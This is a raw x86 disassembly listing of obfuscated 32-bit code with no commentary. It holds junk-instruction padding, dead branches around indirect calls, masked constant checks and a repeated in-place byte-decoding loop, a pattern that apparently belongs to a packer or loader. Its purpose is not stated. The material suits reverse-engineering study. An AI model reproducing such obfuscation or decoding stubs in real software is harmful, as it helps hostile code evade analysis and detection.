  41d67a:	push   DWORD PTR [ebp-0x18]
  41d67d:	call   DWORD PTR ds:0x42a064
  41d683:	mov    edx,DWORD PTR ds:0x422abe
  41d689:	mov    ecx,DWORD PTR ds:0x422ac6
  41d68f:	sub    edx,ecx
  41d691:	or     edx,DWORD PTR [edx+ecx*1]
  41d694:	mov    edi,DWORD PTR ds:0x4229ba
  41d69a:	sbb    edi,DWORD PTR ds:0x4228ba
  41d6a0:	mov    DWORD PTR ds:0x4229ba,edi
  41d6a6:	or     DWORD PTR ds:0x422966,0x5f8
  41d6b0:	adc    DWORD PTR ds:0x42298e,0x1669
  41d6ba:	mov    ecx,DWORD PTR ds:0x422a52
  41d6c0:	mov    ebx,DWORD PTR ds:0x422ac2
  41d6c6:	sub    ebx,ecx
  41d6c8:	or     ecx,DWORD PTR [ecx+ebx*1]
  41d6cb:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6ce:	xor    edi,0x396f
  41d6d4:	shrd   eax,ecx,0x2
  41d6d8:	adc    DWORD PTR ds:0x42295a,edi
  41d6de:	xor    eax,esi
  41d6e0:	adc    ebx,edi
  41d6e2:	shr    ecx,0x2
  41d6e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d6e8:	inc    ebx
  41d6e9:	mov    edx,DWORD PTR [ebp+0xc]
  41d6ec:	xor    edx,edx
  41d6ee:	xor    ebx,DWORD PTR ds:0x42295a
  41d6f4:	or     eax,edx
  41d6f6:	sub    edx,0x59e2
  41d6fc:	mov    DWORD PTR [ebp-0x28],eax
  41d6ff:	mov    eax,ds:0x4220e8
  41d704:	add    DWORD PTR ds:0x4228d2,edx
  41d70a:	mov    eax,DWORD PTR [eax]
  41d70c:	xor    DWORD PTR ds:0x42293a,0x4228c2
  41d716:	mov    DWORD PTR [ebp-0xc],eax
  41d719:	mov    eax,ds:0x422308
  41d71e:	sub    ebx,0x7e01
  41d724:	mov    eax,DWORD PTR [eax]
  41d726:	mov    ebx,DWORD PTR ds:0x422a42
  41d72c:	xor    edi,edi
  41d72e:	xor    edi,DWORD PTR ds:0x422a9a
  41d734:	sub    edi,ebx
  41d736:	and    ebx,DWORD PTR [ebx+edi*1]
  41d739:	mov    DWORD PTR [ebp-0x10],eax
  41d73c:	cmp    DWORD PTR ds:0x4229c6,0x0
  41d743:	mov    DWORD PTR ds:0x42295a,ebx
  41d749:	mov    DWORD PTR ds:0x42297e,0x12ca
  41d753:	jmp    0x41d793
  41d758:	mov    DWORD PTR ds:0x4229c2,ebx
  41d75e:	jl     0x41d77b
  41d764:	push   0x4227af
  41d769:	call   DWORD PTR ds:0x42a180
  41d76f:	dec    DWORD PTR ds:0x4228de
  41d775:	or     edi,DWORD PTR ds:0x4229c6
  41d77b:	adc    DWORD PTR ds:0x422902,0x16ea
  41d785:	or     DWORD PTR ds:0x42291e,ecx
  41d78b:	neg    edi
  41d78d:	sbb    DWORD PTR ds:0x4228c6,edx
  41d793:	mov    eax,DWORD PTR [ebp-0xc]
  41d796:	or     eax,DWORD PTR ds:0x422936
  41d79c:	mov    eax,DWORD PTR [ebp-0xc]
  41d79f:	or     DWORD PTR ds:0x42297e,0xd91
  41d7a9:	shl    ecx,0x1e
  41d7ac:	sub    DWORD PTR ds:0x4228da,0x4229c2
  41d7b6:	xor    ecx,ecx
  41d7b8:	adc    DWORD PTR ds:0x422972,ecx
  41d7be:	shld   ecx,eax,0x2
  41d7c2:	cmp    DWORD PTR ds:0x4229ba,0x0
  41d7c9:	movzx  ebx,BYTE PTR ds:0x422926
  41d7d0:	mov    DWORD PTR ds:0x4228fe,0x7bb6
  41d7da:	mov    DWORD PTR ds:0x422922,edi
  41d7e0:	movzx  ebx,BYTE PTR ds:0x422966
  41d7e7:	jmp    0x41d860
  41d7ec:	mov    DWORD PTR ds:0x4229b6,0x5617
  41d7f6:	mov    DWORD PTR ds:0x4229ca,0x1a8d
  41d800:	je     0x41d835
  41d806:	push   0x4228c6
  41d80b:	push   0x422906
  41d810:	push   0x148f
  41d815:	call   DWORD PTR ds:0x42a068
  41d81b:	xor    ebx,ebx
  41d81d:	add    ebx,DWORD PTR ds:0x422a8a
  41d823:	mov    edx,DWORD PTR ds:0x422ada
  41d829:	sub    ebx,edx
  41d82b:	xor    ebx,DWORD PTR [ebx+edx*1]
  41d82e:	add    ebx,DWORD PTR ds:0x422906
  41d834:	inc    ebx
  41d835:	movzx  edx,BYTE PTR ds:0x42291e
  41d83c:	or     edx,DWORD PTR ds:0x42290e
  41d842:	mov    DWORD PTR ds:0x42291e,edx
  41d848:	mov    DWORD PTR ds:0x4228be,0x3c15
  41d852:	xor    edi,edi
  41d854:	add    edi,DWORD PTR ds:0x42296a
  41d85a:	and    DWORD PTR ds:0x4229a2,edi
  41d860:	mov    edi,DWORD PTR [ebp+0x8]
  41d863:	mov    ebx,DWORD PTR [ebp+0xc]
  41d866:	shl    eax,0x2
  41d869:	and    edx,DWORD PTR ds:0x422996
  41d86f:	mov    DWORD PTR [ebp-0x34],ebx
  41d872:	or     edx,DWORD PTR ds:0x422942
  41d878:	xor    ebx,ebx
  41d87a:	or     edx,DWORD PTR ds:0x42297e
  41d880:	mov    edx,0x9c0a89d8
  41d885:	xor    DWORD PTR ds:0x42293e,0x38e7
  41d88f:	xor    eax,0xba699573
  41d894:	xor    ecx,edx
  41d896:	mov    DWORD PTR ds:0x422966,0x5827
  41d8a0:	inc    ebx
  41d8a1:	mov    DWORD PTR ds:0x42288e,0x1c53
  41d8ab:	mov    DWORD PTR [ebp-0x1c],0xa3e69b9d
  41d8b2:	mov    DWORD PTR ds:0x42296a,0x3d21
  41d8bc:	mov    DWORD PTR [ebp-0x18],0xa3e6929d
  41d8c3:	mov    DWORD PTR ds:0x4228d6,0x742f
  41d8cd:	cmp    eax,edi
  41d8cf:	mov    DWORD PTR ds:0x42289e,0x5996
  41d8d9:	jne    0x41d8fc
  41d8df:	mov    DWORD PTR ds:0x4228e2,0x7e38
  41d8e9:	cmp    ecx,DWORD PTR [ebp-0x34]
  41d8ec:	mov    DWORD PTR ds:0x422976,0x4e71
  41d8f6:	je     0x41de95
  41d8fc:	xor    edi,edi
  41d8fe:	mov    eax,DWORD PTR [ebp-0x10]
  41d901:	mov    eax,DWORD PTR [ebp-0x10]
  41d904:	and    edi,0x18bc
  41d90a:	xor    ecx,ecx
  41d90c:	shld   ecx,eax,0x2
  41d910:	cmp    DWORD PTR ds:0x4228a6,0x0
  41d917:	not    edi
  41d919:	mov    DWORD PTR ds:0x422916,0x65a0
  41d923:	mov    edi,DWORD PTR ds:0x4229c6
  41d929:	jmp    0x41d983
  41d92e:	mov    DWORD PTR ds:0x42291e,0x42bf
  41d938:	jl     0x41d963
  41d93e:	push   DWORD PTR [ebp-0x18]
  41d941:	call   DWORD PTR ds:0x42a184
  41d947:	mov    edi,DWORD PTR ds:0x42292a
  41d94d:	xor    DWORD PTR ds:0x42297e,edi
  41d953:	add    edi,DWORD PTR ds:0x422926
  41d959:	and    DWORD PTR ds:0x42296e,0x3699
  41d963:	sub    DWORD PTR ds:0x4229d2,ecx
  41d969:	xor    DWORD PTR ds:0x42291a,0x37de
  41d973:	sbb    edi,0x14bf
  41d979:	sbb    DWORD PTR ds:0x422906,0x2f26
  41d983:	shl    eax,0x2
  41d986:	xor    ecx,edx
  41d988:	mov    edx,DWORD PTR [ebp+0x8]
  41d98b:	cmp    DWORD PTR ds:0x4228f6,0x0
  41d992:	mov    DWORD PTR ds:0x4229b2,0x11be
  41d99c:	mov    edi,DWORD PTR ds:0x42298a
  41d9a2:	mov    edi,0x436a
  41d9a7:	mov    edi,0x787d
  41d9ac:	jmp    0x41da17
  41d9b1:	mov    DWORD PTR ds:0x42294e,ecx
  41d9b7:	jne    0x41d9ea
  41d9bd:	push   0x58ed
  41d9c2:	push   DWORD PTR [ebp-0xc]
  41d9c5:	push   0x4fe0
  41d9ca:	call   DWORD PTR ds:0x42a188
  41d9d0:	sub    DWORD PTR ds:0x4228c2,0x42290a
  41d9da:	inc    DWORD PTR ds:0x422916
  41d9e0:	sub    DWORD PTR ds:0x4228f2,0x2f59
  41d9ea:	movzx  edi,BYTE PTR ds:0x42295e
  41d9f1:	or     edi,DWORD PTR ds:0x4229b6
  41d9f7:	mov    DWORD PTR ds:0x42295e,edi
  41d9fd:	sub    DWORD PTR ds:0x4229c2,edx
  41da03:	adc    DWORD PTR ds:0x42299a,0x4229a2
  41da0d:	and    DWORD PTR ds:0x4228be,0x217e
  41da17:	mov    edi,DWORD PTR [ebp+0xc]
  41da1a:	xor    eax,0xba699573
  41da1f:	mov    DWORD PTR ds:0x4229ae,0x94b
  41da29:	cmp    eax,edx
  41da2b:	mov    DWORD PTR ds:0x4229be,0x7ea4
  41da35:	jne    0x41da4d
  41da3b:	mov    DWORD PTR ds:0x4228ee,0x77f8
  41da45:	cmp    ecx,edi
  41da47:	je     0x41de95
  41da4d:	cmp    DWORD PTR ds:0x42292a,0x0
  41da54:	mov    DWORD PTR ds:0x4228e6,0x4ba6
  41da5e:	mov    DWORD PTR ds:0x42289e,0x1c76
  41da68:	jmp    0x41dacb
  41da6d:	mov    ecx,DWORD PTR ds:0x422892
  41da73:	mov    DWORD PTR ds:0x422892,0x488a
  41da7d:	jg     0x41dab2
  41da83:	push   0x42298a
  41da88:	push   DWORD PTR [ebp-0xc]
  41da8b:	push   0x422737
  41da90:	push   0x58d5
  41da95:	call   DWORD PTR ds:0x42a18c
  41da9b:	mov    ecx,DWORD PTR ds:0x42299a
  41daa1:	sbb    DWORD PTR ds:0x4229aa,ecx
  41daa7:	xor    DWORD PTR ds:0x422986,0x108
  41dab1:	dec    ecx
  41dab2:	sbb    ecx,DWORD PTR ds:0x4229c2
  41dab8:	mov    ecx,DWORD PTR ds:0x422aa6
  41dabe:	xor    edi,edi
  41dac0:	xor    edi,DWORD PTR ds:0x422aee
  41dac6:	sub    ecx,edi
  41dac8:	add    ecx,DWORD PTR [ecx+edi*1]
  41dacb:	mov    eax,DWORD PTR [ebp-0x18]
  41dace:	adc    DWORD PTR ds:0x422922,0x2ce9
  41dad8:	mov    ecx,DWORD PTR [ebp-0x18]
  41dadb:	neg    edi
  41dadd:	xor    ecx,ebx
  41dadf:	shl    ecx,0x1e
  41dae2:	sbb    DWORD PTR ds:0x4229b2,edx
  41dae8:	mov    edi,0xa3e69a9f
  41daed:	xor    eax,edi
  41daef:	shr    eax,0x2
  41daf2:	or     DWORD PTR ds:0x42298a,0x42289a
  41dafc:	or     eax,ecx
  41dafe:	cmp    DWORD PTR ds:0x42299a,0x0
  41db05:	movzx  ecx,WORD PTR ds:0x42293a
  41db0c:	not    ecx
  41db0e:	jmp    0x41db72
  41db13:	mov    DWORD PTR ds:0x4229d2,0x1c9
  41db1d:	je     0x41db4c
  41db23:	push   0x1982
  41db28:	call   DWORD PTR ds:0x42a2a4
  41db2e:	sub    ecx,0x256c
  41db34:	sub    DWORD PTR ds:0x4229d2,edx
  41db3a:	mov    ecx,DWORD PTR ds:0x4229ca
  41db40:	or     DWORD PTR ds:0x42297a,ecx
  41db46:	add    DWORD PTR ds:0x42293e,edx
  41db4c:	xor    ecx,0x2a90
  41db52:	adc    ecx,DWORD PTR ds:0x4228e2
  41db58:	xor    DWORD PTR ds:0x4228c2,edx
  41db5e:	xor    ecx,ecx
  41db60:	or     ecx,DWORD PTR ds:0x4228e2
  41db66:	and    DWORD PTR ds:0x4228f6,ecx
  41db6c:	sbb    DWORD PTR ds:0x422932,edx
  41db72:	mov    DWORD PTR [ebp-0x34],eax
  41db75:	xor    ecx,0x70df
  41db7b:	mov    eax,ds:0x422268
  41db80:	mov    ecx,DWORD PTR ds:0x4228d2
  41db86:	adc    ecx,DWORD PTR ds:0x422976
  41db8c:	mov    DWORD PTR ds:0x4228d2,ecx
  41db92:	mov    DWORD PTR [ebp-0x34],eax
  41db95:	xor    eax,eax
  41db97:	xor    eax,DWORD PTR ds:0x4228a6
  41db9d:	sbb    DWORD PTR ds:0x42294a,eax
  41dba3:	mov    eax,DWORD PTR [ebp-0xc]
  41dba6:	cmp    DWORD PTR ds:0x4229c6,0x0
  41dbad:	mov    DWORD PTR ds:0x4228fe,0x1213
  41dbb7:	movzx  ecx,WORD PTR ds:0x4228b2
  41dbbe:	jmp    0x41dc2b
  41dbc3:	mov    DWORD PTR ds:0x42298a,0x52a1
  41dbcd:	mov    DWORD PTR ds:0x422962,edx
  41dbd3:	jg     0x41dc08
  41dbd9:	push   DWORD PTR [ebp-0x24]
  41dbdc:	push   0x4008
  41dbe1:	push   0x37a6
  41dbe6:	call   DWORD PTR ds:0x42a06c
  41dbec:	and    ecx,DWORD PTR ds:0x422946
  41dbf2:	sub    DWORD PTR ds:0x42291a,ebx
  41dbf8:	adc    DWORD PTR ds:0x4228e6,edx
  41dbfe:	xor    DWORD PTR ds:0x42290a,0x1acd
  41dc08:	dec    ecx
  41dc09:	add    DWORD PTR ds:0x42289a,0x219e
  41dc13:	mov    ecx,DWORD PTR ds:0x4228fa
  41dc19:	and    DWORD PTR ds:0x42291a,ecx
  41dc1f:	mov    ecx,DWORD PTR ds:0x4228e6
  41dc25:	or     DWORD PTR ds:0x4228ae,ecx
  41dc2b:	mov    DWORD PTR [ebp-0x14],eax
  41dc2e:	cmp    DWORD PTR ds:0x42299a,0x0
  41dc35:	mov    DWORD PTR ds:0x4228f6,0x5b1a
  41dc3f:	mov    ecx,0x5f2a
  41dc44:	jmp    0x41dc77
  41dc49:	mov    DWORD PTR ds:0x422922,0x1bb2
  41dc53:	jg     0x41dc6a
  41dc59:	push   DWORD PTR [ebp-0x1c]
  41dc5c:	call   DWORD PTR ds:0x42a190
  41dc62:	or     ecx,ecx
  41dc64:	add    ecx,DWORD PTR ds:0x4228ba
  41dc6a:	xor    ecx,ecx
  41dc6c:	dec    ecx
  41dc6d:	or     DWORD PTR ds:0x4228de,0x336d
  41dc77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc7a:	push   0x4
  41dc7c:	pop    eax
  41dc7d:	sub    eax,ecx
  41dc7f:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc82:	add    ecx,eax
  41dc84:	mov    DWORD PTR [ebp-0x24],ecx
  41dc87:	lea    eax,[ebp-0x30]
  41dc8a:	mov    DWORD PTR [ebp-0x2c],eax
  41dc8d:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc90:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc93:	xor    eax,edi
  41dc95:	xor    ecx,ebx
  41dc97:	shr    eax,0x2
  41dc9a:	shl    ecx,0x1e
  41dc9d:	or     eax,ecx
  41dc9f:	mov    DWORD PTR [ebp-0x20],eax
  41dca2:	mov    DWORD PTR [ebp-0x8],0xa3e69a8d
  41dca9:	mov    eax,DWORD PTR [ebp-0x8]
  41dcac:	mov    ecx,DWORD PTR [ebp-0x8]
  41dcaf:	xor    eax,edi
  41dcb1:	xor    ecx,ebx
  41dcb3:	shr    eax,0x2
  41dcb6:	shl    ecx,0x1e
  41dcb9:	or     ecx,eax
  41dcbb:	push   ecx
  41dcbc:	lea    eax,[ebp-0x8]
  41dcbf:	push   eax
  41dcc0:	lea    eax,[ebp-0x7c]
  41dcc3:	push   eax
  41dcc4:	call   0x41d30a
  41dcc9:	mov    eax,DWORD PTR [ebp-0x8]
  41dccc:	mov    ecx,DWORD PTR [ebp-0x8]
  41dccf:	xor    eax,edi
  41dcd1:	xor    ecx,ebx
  41dcd3:	shr    eax,0x2
  41dcd6:	shl    ecx,0x1e
  41dcd9:	or     ecx,eax
  41dcdb:	push   ecx
  41dcdc:	lea    eax,[ebp-0x14]
  41dcdf:	push   eax
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    ecx,DWORD PTR [ebp+0xc]
  41dce6:	shrd   eax,ecx,0x2
  41dcea:	shr    ecx,0x2
  41dced:	mov    ecx,DWORD PTR [ebp+0x8]
  41dcf0:	mov    edx,DWORD PTR [ebp+0xc]
  41dcf3:	xor    eax,esi
  41dcf5:	xor    edx,edx
  41dcf7:	or     eax,edx
  41dcf9:	lea    eax,[ebp+eax*4-0x78]
  41dcfd:	push   eax
  41dcfe:	shl    ecx,0x1e
  41dd01:	call   0x41d30a
  41dd06:	mov    eax,DWORD PTR [ebp-0x8]
  41dd09:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd0c:	xor    eax,edi
  41dd0e:	xor    ecx,ebx
  41dd10:	shr    eax,0x2
  41dd13:	shl    ecx,0x1e
  41dd16:	or     ecx,eax
  41dd18:	push   ecx
  41dd19:	lea    eax,[ebp-0x24]
  41dd1c:	push   eax
  41dd1d:	mov    eax,DWORD PTR [ebp+0x10]
  41dd20:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd23:	shrd   eax,ecx,0x2
  41dd27:	shr    ecx,0x2
  41dd2a:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd2d:	mov    edx,DWORD PTR [ebp+0x14]
  41dd30:	xor    eax,esi
  41dd32:	xor    edx,edx
  41dd34:	or     eax,edx
  41dd36:	lea    eax,[ebp+eax*4-0x78]
  41dd3a:	push   eax
  41dd3b:	shl    ecx,0x1e
  41dd3e:	call   0x41d30a
  41dd43:	mov    eax,DWORD PTR [ebp-0x8]
  41dd46:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd49:	xor    ecx,ebx
  41dd4b:	xor    eax,edi
  41dd4d:	shl    ecx,0x1e
  41dd50:	shr    eax,0x2
  41dd53:	or     ecx,eax
  41dd55:	push   ecx
  41dd56:	lea    eax,[ebp-0x20]
  41dd59:	push   eax
  41dd5a:	mov    eax,DWORD PTR [ebp+0x10]
  41dd5d:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd60:	shrd   eax,ecx,0x2
  41dd64:	shr    ecx,0x2
  41dd67:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd6a:	mov    edx,DWORD PTR [ebp+0x14]
  41dd6d:	xor    edx,edx
  41dd6f:	xor    eax,esi
  41dd71:	or     eax,edx
  41dd73:	shl    ecx,0x1e
  41dd76:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd79:	mov    edx,DWORD PTR [ebp+0x14]
  41dd7c:	shrd   ecx,edx,0x2
  41dd80:	shr    edx,0x2
  41dd83:	mov    edx,DWORD PTR [ebp+0x10]
  41dd86:	mov    ebx,DWORD PTR [ebp+0x14]
  41dd89:	xor    ecx,esi
  41dd8b:	xor    ebx,ebx
  41dd8d:	or     ecx,ebx
  41dd8f:	add    eax,ecx
  41dd91:	lea    eax,[ebp+eax*4-0x78]
  41dd95:	push   eax
  41dd96:	shl    edx,0x1e
  41dd99:	call   0x41d30a
  41dd9e:	mov    eax,DWORD PTR [ebp-0x8]
  41dda1:	mov    ecx,DWORD PTR [ebp-0x8]
  41dda4:	xor    ecx,0x1
  41dda7:	shl    ecx,0x1e
  41ddaa:	xor    eax,edi
  41ddac:	shr    eax,0x2
  41ddaf:	or     ecx,eax
  41ddb1:	push   ecx
  41ddb2:	lea    eax,[ebp-0x2c]
  41ddb5:	push   eax
  41ddb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ddb9:	mov    ecx,DWORD PTR [ebp+0x14]
  41ddbc:	shrd   eax,ecx,0x2
  41ddc0:	shr    ecx,0x2
  41ddc3:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddc6:	mov    edx,DWORD PTR [ebp+0x14]
  41ddc9:	xor    edx,edx
  41ddcb:	shl    ecx,0x1e
  41ddce:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddd1:	xor    eax,esi
  41ddd3:	or     eax,edx
  41ddd5:	mov    edx,DWORD PTR [ebp+0x14]
  41ddd8:	shrd   ecx,edx,0x2
  41dddc:	shr    edx,0x2
  41dddf:	mov    edx,DWORD PTR [ebp+0x10]
  41dde2:	mov    ebx,DWORD PTR [ebp+0x14]
  41dde5:	xor    ecx,esi
  41dde7:	xor    ebx,ebx
  41dde9:	or     ecx,ebx
  41ddeb:	shl    edx,0x1e
  41ddee:	add    eax,ecx
  41ddf0:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddf3:	mov    edx,DWORD PTR [ebp+0x14]
  41ddf6:	shrd   ecx,edx,0x2
  41ddfa:	shr    edx,0x2
  41ddfd:	mov    edx,DWORD PTR [ebp+0x10]
  41de00:	mov    ebx,DWORD PTR [ebp+0x14]
  41de03:	xor    ecx,esi
  41de05:	xor    ebx,ebx
  41de07:	or     ecx,ebx
  41de09:	add    eax,ecx
  41de0b:	lea    eax,[ebp+eax*4-0x78]
  41de0f:	push   eax
  41de10:	shl    edx,0x1e
  41de13:	call   0x41d30a
  41de18:	mov    eax,DWORD PTR [ebp-0x7c]
  41de1b:	mov    ecx,DWORD PTR [ebp-0x7c]
  41de1e:	xor    eax,edi
  41de20:	shr    eax,0x2
  41de23:	inc    ebx
  41de24:	xor    ecx,ebx
  41de26:	shl    ecx,0x1e
  41de29:	or     ecx,eax
  41de2b:	mov    DWORD PTR [ebp-0x7c],ecx
  41de2e:	lea    eax,[ebp-0x7c]
  41de31:	push   eax
  41de32:	mov    eax,DWORD PTR [ebp+0x10]
  41de35:	mov    ecx,DWORD PTR [ebp+0x14]
  41de38:	shrd   eax,ecx,0x2
  41de3c:	shr    ecx,0x2
  41de3f:	mov    ecx,DWORD PTR [ebp+0x10]
  41de42:	mov    edx,DWORD PTR [ebp+0x14]
  41de45:	xor    eax,esi
  41de47:	xor    edx,edx
  41de49:	or     eax,edx
  41de4b:	push   eax
  41de4c:	mov    eax,ds:0x422298
  41de51:	mov    edi,0x4221de
  41de56:	push   edi
  41de57:	push   DWORD PTR [eax]
  41de59:	shl    ecx,0x1e
  41de5c:	call   0x41f837
  41de61:	lea    eax,[ebp-0x7c]
  41de64:	push   eax
  41de65:	mov    eax,DWORD PTR [ebp+0x10]
  41de68:	mov    ecx,DWORD PTR [ebp+0x14]
  41de6b:	shrd   eax,ecx,0x2
  41de6f:	shr    ecx,0x2
  41de72:	mov    ecx,DWORD PTR [ebp+0x10]
  41de75:	mov    edx,DWORD PTR [ebp+0x14]
  41de78:	xor    eax,esi
  41de7a:	xor    edx,edx
  41de7c:	or     eax,edx
  41de7e:	push   eax
  41de7f:	mov    eax,ds:0x422298
  41de84:	push   edi
  41de85:	push   DWORD PTR [eax]
  41de87:	shl    ecx,0x1e
  41de8a:	call   0x41f837
  41de8f:	mov    eax,DWORD PTR [ebp-0x30]
  41de92:	mov    eax,DWORD PTR [ebp-0x20]
  41de95:	mov    edi,DWORD PTR [ebp-0x14]
  41de98:	mov    eax,DWORD PTR [ebp-0x24]
  41de9b:	mov    ecx,edi
  41de9d:	mov    DWORD PTR [ebp-0x18],eax
  41dea0:	rol    ecx,0x2
  41dea3:	mov    eax,0xa3e69a9d
  41dea8:	xor    ecx,eax
  41deaa:	cmp    ecx,eax
  41deac:	je     0x41df8e
  41deb2:	mov    DWORD PTR [ebp-0x1c],0x1001
  41deb9:	mov    ecx,DWORD PTR [ebp-0x18]
  41debc:	xor    eax,eax
  41debe:	mov    DWORD PTR [ebp-0x34],ecx
  41dec1:	test   ecx,ecx
  41dec3:	je     0x41deef
  41dec9:	mov    cl,BYTE PTR [eax+edi*1]
  41decc:	mov    BYTE PTR [ebp-0x1],cl
  41decf:	movzx  ecx,BYTE PTR [ebp-0x1]
  41ded3:	sub    ecx,0xea
  41ded9:	mov    BYTE PTR [ebp-0x1],cl
  41dedc:	ror    BYTE PTR [ebp-0x1],1
  41dedf:	mov    cl,BYTE PTR [ebp-0x1]
  41dee2:	mov    BYTE PTR [eax+edi*1],cl
  41dee5:	inc    eax
  41dee6:	cmp    eax,DWORD PTR [ebp-0x34]
  41dee9:	jb     0x41dec9
  41deef:	dec    DWORD PTR [ebp-0x1c]
  41def2:	jne    0x41deb9
  41def8:	mov    eax,DWORD PTR [ebp+0x8]
  41defb:	mov    ecx,DWORD PTR [ebp+0xc]
  41defe:	shrd   eax,ecx,0x2
  41df02:	shr    ecx,0x2
  41df05:	mov    ecx,DWORD PTR [ebp+0x8]
  41df08:	mov    edx,DWORD PTR [ebp+0xc]
  41df0b:	xor    eax,esi
  41df0d:	xor    edx,edx
  41df0f:	or     eax,edx
  41df11:	push   ebx
  41df12:	add    eax,edi
  41df14:	push   eax
  41df15:	lea    eax,[ebp-0x2]
  41df18:	push   eax
  41df19:	shl    ecx,0x1e
  41df1c:	call   0x41d30a
  41df21:	mov    eax,DWORD PTR [ebp+0x10]
  41df24:	mov    ecx,DWORD PTR [ebp+0x14]
  41df27:	shrd   eax,ecx,0x2
  41df2b:	shr    ecx,0x2
  41df2e:	mov    ecx,DWORD PTR [ebp+0x10]
  41df31:	mov    edx,DWORD PTR [ebp+0x14]
  41df34:	xor    eax,esi
  41df36:	xor    edx,edx
  41df38:	or     eax,edx
  41df3a:	add    eax,edi
  41df3c:	push   ebx
  41df3d:	push   eax
  41df3e:	mov    eax,DWORD PTR [ebp+0x8]
  41df41:	shl    ecx,0x1e
  41df44:	mov    ecx,DWORD PTR [ebp+0xc]
  41df47:	shrd   eax,ecx,0x2
  41df4b:	shr    ecx,0x2
  41df4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41df51:	mov    edx,DWORD PTR [ebp+0xc]
  41df54:	xor    eax,esi
  41df56:	xor    edx,edx
  41df58:	or     eax,edx
  41df5a:	add    eax,edi
  41df5c:	push   eax
  41df5d:	shl    ecx,0x1e
  41df60:	call   0x41d30a
  41df65:	push   ebx
  41df66:	lea    eax,[ebp-0x2]
  41df69:	push   eax
  41df6a:	mov    eax,DWORD PTR [ebp+0x10]
  41df6d:	mov    ecx,DWORD PTR [ebp+0x14]
  41df70:	shrd   eax,ecx,0x2
  41df74:	shr    ecx,0x2
  41df77:	mov    ecx,DWORD PTR [ebp+0x10]
  41df7a:	mov    edx,DWORD PTR [ebp+0x14]
  41df7d:	xor    eax,esi
  41df7f:	xor    edx,edx
  41df81:	or     eax,edx
  41df83:	add    eax,edi
  41df85:	push   eax
  41df86:	shl    ecx,0x1e
  41df89:	call   0x41d30a
  41df8e:	mov    eax,DWORD PTR [ebp+0x10]
  41df91:	mov    ecx,DWORD PTR [ebp+0x14]
  41df94:	shrd   eax,ecx,0x2
  41df98:	shr    ecx,0x2
  41df9b:	mov    ecx,DWORD PTR [ebp+0x10]
  41df9e:	mov    edx,DWORD PTR [ebp+0x14]
  41dfa1:	pop    edi
  41dfa2:	xor    eax,esi
  41dfa4:	xor    edx,edx
  41dfa6:	pop    esi
  41dfa7:	shl    ecx,0x1e
  41dfaa:	or     eax,edx
  41dfac:	pop    ebx
  41dfad:	leave  
  41dfae:	ret    0x10
  41dfb1:	mov    eax,DWORD PTR [esp+0x8]
  41dfb5:	mov    ecx,DWORD PTR [esp+0x10]
  41dfb9:	xor    DWORD PTR ds:0x4228ba,0x2ee8
  41dfc3:	or     ecx,eax
  41dfc5:	not    ecx
  41dfc7:	mov    ecx,DWORD PTR [esp+0xc]
  41dfcb:	mov    DWORD PTR ds:0x422936,0x71b
  41dfd5:	jne    0x41e069
  41dfdb:	cmp    DWORD PTR ds:0x422936,0x0
  41dfe2:	not    DWORD PTR ds:0x42292a
  41dfe8:	mov    DWORD PTR ds:0x42291a,0x73d7
  41dff2:	mov    DWORD PTR ds:0x4229ce,0x27c3
  41dffc:	jmp    0x41e060
  41e001:	mov    eax,0x55fe
  41e006:	jge    0x41e050
  41e00c:	push   0x626f
  41e011:	push   DWORD PTR [ebp-0x10]
  41e014:	push   DWORD PTR [ebp-0x10]
  41e017:	push   DWORD PTR [ebp-0x14]
  41e01a:	push   DWORD PTR [ebp-0x14]
  41e01d:	push   0x6abc
  41e022:	call   DWORD PTR ds:0x42a194
  41e028:	sbb    DWORD PTR ds:0x42295e,0x422926
  41e032:	xor    DWORD PTR ds:0x4228de,0x422996
  41e03c:	or     DWORD PTR ds:0x4229b2,0x422932
  41e046:	or     DWORD PTR ds:0x422906,0x42298e
  41e050:	or     DWORD PTR ds:0x4229a2,0x766e
  41e05a:	sbb    DWORD PTR ds:0x422996,ebx
  41e060:	mov    eax,DWORD PTR [esp+0x4]
  41e064:	mul    ecx
  41e066:	ret    0x10
  41e069:	push   ebx
  41e06a:	mul    ecx
  41e06c:	mov    ebx,eax
  41e06e:	mov    eax,DWORD PTR [esp+0x8]
  41e072:	mul    DWORD PTR [esp+0x14]
  41e076:	add    ebx,eax
  41e078:	mov    eax,DWORD PTR [esp+0x8]
  41e07c:	mul    ecx
  41e07e:	add    edx,ebx
  41e080:	pop    ebx
  41e081:	ret    0x10
  41e084:	push   ebp
  41e085:	mov    ebp,esp
  41e087:	sub    esp,0x30
  41e08a:	push   ebx
  41e08b:	push   esi
  41e08c:	push   edi
  41e08d:	mov    DWORD PTR [ebp-0xc],0x1d4c
  41e094:	mov    DWORD PTR [ebp-0x8],0x1c4a
  41e09b:	mov    DWORD PTR [ebp-0x4],0x73ba
  41e0a2:	mov    DWORD PTR [ebp-0x1c],0x7afa
  41e0a9:	mov    DWORD PTR [ebp-0x18],0x618d
  41e0b0:	mov    DWORD PTR [ebp-0x14],0x7b8c
  41e0b7:	mov    DWORD PTR [ebp-0x10],0x46ba
  41e0be:	mov    DWORD PTR [ebp-0x30],0x6996
  41e0c5:	mov    DWORD PTR [ebp-0x2c],0x3bbb
  41e0cc:	mov    DWORD PTR [ebp-0x28],0x571e
  41e0d3:	mov    DWORD PTR [ebp-0x24],0x46e5
  41e0da:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0dd:	imul   ecx,ecx,0x7649
  41e0e3:	add    ecx,DWORD PTR [ebp-0x18]
  41e0e6:	xor    edx,edx
  41e0e8:	add    ecx,DWORD PTR [ebp-0x1c]
  41e0eb:	mov    eax,DWORD PTR [ebp-0x4]
